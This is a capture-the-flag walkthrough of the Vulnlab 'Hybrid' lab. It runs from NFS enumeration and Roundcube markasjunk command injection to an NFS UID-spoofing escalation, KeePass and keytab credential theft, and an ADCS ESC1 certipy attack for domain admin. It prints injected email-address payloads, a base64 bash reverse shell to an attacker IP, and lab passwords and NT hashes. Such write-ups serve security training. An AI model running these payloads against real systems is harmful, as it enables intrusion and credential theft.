
# Vulnlab - Hybrid

# dc01

## NMAP

```bash
Nmap scan report for 10.10.177.197
Host is up (1.1s latency).
Not shown: 65523 filtered tcp ports (no-response)       
PORT      STATE SERVICE    VERSION                                     
53/tcp    open  tcpwrapped           
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped           
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
3268/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
|_ssl-date: 2023-07-09T15:21:51+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Issuer: commonName=dc01.hybrid.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T08:29:18
| Not valid after:  2023-12-17T08:29:18
| MD5:   503e6a310914a23a96f899c161496768
|_SHA-1: 8b350872418cb813302ad430acb1b1497acada2e
49669/tcp open  tcpwrapped
51915/tcp open  tcpwrapped
51928/tcp open  tcpwrapped
53128/tcp open  tcpwrapped
57220/tcp open  tcpwrapped
Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2023-07-09T15:21:28
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

```

## PORT 445 (SMB)

From dc01, we only see smb service running which we can try enumerating with anonymous login which didn't worked

<img src="https://i.imgur.com/7nDowUn.png"/>

# mail01

## NMAP

```bash
Nmap scan report for 10.10.177.198
PORT      STATE SERVICE  VERSION                        
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)                           
| ssh-hostkey:         
|   256 60bc2226783cb4e06beaaa1ec1625dde (ECDSA)
|_  256 a3b5d86106e63a418845e35203d2231b (ED25519)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: Couldn't establish connection on port 25   
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu) 
110/tcp   open  pop3     Dovecot pop3d                  
111/tcp   open  rpcbind
143/tcp   open  imap     Dovecot imapd (Ubuntu)
587/tcp   open  smtp     Postfix smtpd                  
|_smtp-commands: Couldn't establish connection on port 587
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   38372b812fb16f03436025b4d26bdb29
|_SHA-1: 61c2400271ff7850e0da4a5ae256e7df666bb008
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   38372b812fb16f03436025b4d26bdb29
|_SHA-1: 61c2400271ff7850e0da4a5ae256e7df666bb008
2049/tcp  open  rpcbind
33893/tcp open  rpcbind
37693/tcp open  rpcbind
42661/tcp open  rpcbind
46025/tcp open  rpcbind
47609/tcp open  rpcbind
```

## PORT 80 (HTTP)

mail01 had web server running on port 80 which redirects to `mail01.hybrid.vl`

<img src="https://i.imgur.com/wHjY2tg.png"/>

Adding the domain in `/etc/hosts` file

<img src="https://i.imgur.com/dozFFT4.png"/>

<img src="https://i.imgur.com/yGoXNVY.png"/>

This brings us to `Roudcube webmail` login portal, trying default credentials like `admin:admin` it didn't worked

<img src="https://i.imgur.com/YymmtcS.png"/>

## PORT 2049 (NFS)

mail01 had nfs running on port 2049, we can list the share available to mount

```bash
showmount -e 10.10.177.198
```

<img src="https://i.imgur.com/vlsJ1Gq.png"/>

We can mount this share with the following command

```bash
 mount -t nfs 10.10.177.198:/opt/share /home/arz/VulnLab/Hybrid/share
```

<img src="https://i.imgur.com/jTNX6Iq.png"/>

From this directory we can find `backup.tar.gz`

<img src="https://i.imgur.com/RK99Dx8.png"/>

Extracting the archive

<img src="https://i.imgur.com/weqYfry.png"/>

From the `opt` folder we can find a certificate

<img src="https://i.imgur.com/WqCgUW4.png"/>

And from `/etc/dovecot` we can find the credentials for roundcube mail

<img src="https://i.imgur.com/vniJ98o.png"/>

Logging in as `peter.turner` we can see an email sent from admin talking about spam filter

<img src="https://i.imgur.com/reBLjRP.png"/>

https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/

## Foothold

Following an article for remote code execution on markasjunk plugin we can execute commands by changing the email address of a user by using `${IFS}` which is a variable in bash that represents a space, tab and a new line character

```
admin&curl${IFS}10.8.0.136&@hybrid.vl
```

<img src="https://i.imgur.com/2vbUYXL.png"/>

Now mark any email as junk

<img src="https://i.imgur.com/BykF7ZY.png"/>

We'll get a callback on our listener, so the commands are getting executed

<img src="https://i.imgur.com/TsPEYWd.png"/>

We can get a reverse shell by base64 encoding the payload

```bash
bash -i >& /dev/tcp/10.8.0.136/2222 0>&1

admin&echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjAuMTM2LzIyMjIgMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@hybrid.vl
```

<img src="https://i.imgur.com/tPL8SG1.png"/>

On doing the same procedure, we'll get a reverse shell as `www-data`

<img src="https://i.imgur.com/Mta7ypq.png"/>

In `/home` we only see one user which is a domain user, `peter.turner`, I tried switching to peter by using his roudcube password but it didn't worked

<img src="https://i.imgur.com/dzQyZZ8.png"/>

I tried cracking the password of `privkey.pem` but it took a long time so I decided to give up on that

<img src="https://i.imgur.com/mxeGwrl.png"/>

Reading `/etc/exports` file, we can see there's no `no_root_squash` so we cannot place bash binary owned by root user 

<img src="https://i.imgur.com/KjmOZhX.png"/>

We know there's peter.turner on the victim machine with the id `902601108`

<img src="https://i.imgur.com/rbXIBBC.png"/>

Before creating the user with the same uid on our machine we meed to allow the creation of uids above 60000 range

<img src="https://i.imgur.com/0erBEXx.png"/>

Edit the `/etc/logins.defs` and change the `UID_MAX` value

<img src="https://i.imgur.com/J7Pqk9H.png"/>

<img src="https://i.imgur.com/dSMkmYB.png"/>

Now copying bash binary in the mounted folder 

<img src="https://i.imgur.com/IiFITlW.png"/>

We can see that this binary is owned by peter.turner since we used the same UID and it's a SUID, but on executing it wasn't being executed due to a different GLIBC version, so instead transferring the bash binary from the victim machine and making it a SUID

<img src="https://i.imgur.com/GoNDSL2.png"/>

<img src="https://i.imgur.com/sFInsv8.png"/>

From peter's home directory, we can find `passwords.kdbx` file which is a keepassp password safe file

<img src="https://i.imgur.com/KygFyGS.png"/>

<img src="https://i.imgur.com/eIKT0nI.png"/>
Reading the kdbx file with `kpcli` , it asks for a password

<img src="https://i.imgur.com/JzZLsz3.png"/>

Using peter's roudcube password it worked on this file

<img src="https://i.imgur.com/hzeVRW1.png"/>

From `hybrid.vl` entry we can get the password of peter

<img src="https://i.imgur.com/Dk4jmCf.png"/>
We can use this password to check privileges of peter, which can run anything as root

<img src="https://i.imgur.com/NecyDK8.png"/>

<img src="https://i.imgur.com/zbvqrUf.png"/>

Being root user we can access `/etc/k`

Running `python-bloodhound` to enumerate the trusted.vl domain

```bash
python3 /opt/BloodHound.py-Kerberos/bloodhound.py -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -gc 'dc01.hybrid.vl' -ns 10.10.132.229
```

<img src="https://i.imgur.com/7YAbZwP.png"/>

From bloodhound, there wasn't any path from peter leading to domain admin

<img src="https://i.imgur.com/C3tceXr.png"/>

Enumerating ADCS with `certipy` for vulnerable certificates

```bash
certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.228.165
```

<img src="https://i.imgur.com/MoyRpei.png"/>

Members of `Authenticated users` can enroll and authenticate any user with `hybrid-DC01-CA` (ESC-1), using `old-bloodhound` to get the result in json file so we can view it in bloodhound

```bash
certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.147.37 -old-bloodhound
```

<img src="https://i.imgur.com/JOVfRHr.png"/>

https://raw.githubusercontent.com/ly4k/Certipy/main/customqueries.json

 Make sure to add custom queries for ADCS in `~./config/bloodhound/customqueries.json` to analyze ADCS in the domain

<img src="https://i.imgur.com/aFJBsmi.png"/>

After putting the custom queries we can see the templates being reflected on bloodhound

<img src="https://i.imgur.com/pvmNJGd.png"/>

Marking `hybrid-DC01-CA` as the high value target and checking the shortest path to hybrid-DC01-CA

<img src="https://i.imgur.com/JaoHvnB.png"/>

So now we need MAIL01's hash, going back to linux machine as root user, we can extract the NTHash using https://github.com/sosdave/KeyTabExtract from `/etc/krb5.keytab` 

<img src="https://i.imgur.com/rMCohLl.png"/>

<img src="https://i.imgur.com/61DbiSY.png"/>

From certipy we didn't found any template names, from bloodhound we can see two templates from which using `HYBRIDCOMPUTERS`

<img src="https://i.imgur.com/rFGt0zY.png"/>

On requesting the certificate, it was giving an error related to public key requirement

<img src="https://i.imgur.com/2wz5oA6.png"/>

Checking the pem file we have, we can see the size of the public key, which is 4096 bit

<img src="https://i.imgur.com/A3AUwkq.png"/>

Specifying the size of the public key file and requesting the certificate to authenticate as administrator

```bash
certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.228.165" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096
```

<img src="https://i.imgur.com/5YhgdZl.png"/>

Now again with `certipy` we can request administrator's NTHash

```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.228.165
```

<img src="https://i.imgur.com/5tZOxmC.png"/>

We can get a shell through `wmiexec`

```bash
wmiexec.py administrator@10.10.228.165 -hashes ':60701e8543c9f6db1a2af3217386d3dc'
```

<img src="https://i.imgur.com/ROMPjGs.png"/>


## References

- https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/
- https://github.com/ly4k/Certipy/blob/main/customqueries.json
- https://github.com/sosdave/KeyTabExtract
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration

